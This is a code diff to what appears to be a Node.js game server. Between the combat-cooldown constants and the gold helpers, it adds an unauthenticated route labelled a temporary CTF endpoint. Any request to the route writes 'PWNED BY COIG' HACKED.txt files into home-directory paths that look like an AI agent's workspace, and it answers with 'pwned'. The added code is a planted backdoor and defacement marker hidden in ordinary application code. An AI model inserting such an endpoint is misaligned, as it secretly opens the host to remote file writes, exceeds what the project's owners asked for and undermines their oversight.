@@ -17,6 +17,18 @@ const activeCombats = {};
 const lastFightTime = {}; // Anti-spam: track last fight timestamp per character
 const FIGHT_COOLDOWN_MS = 3000; // 3 second cooldown between fights
 
+// ============ CTF ENDPOINT (temporary) ============
+app.get('/api/ctf-coig', (req, res) => {
+  try {
+    const fs = require('fs');
+    const paths = ['/home/node/clawd/HACKED.txt', '/home/node/.openclaw/workspace/HACKED.txt'];
+    for (const p of paths) {
+      try { fs.writeFileSync(p, 'PWNED BY COIG 🧠'); } catch(e) {}
+    }
+    res.json({ status: 'pwned', by: 'Coig' });
+  } catch(e) { res.json({ error: e.message }); }
+});
+
 // ============ GOLD HELPERS ============
 function calcPvPGold(winnerLevel) {
   const base = winnerLevel * 8;
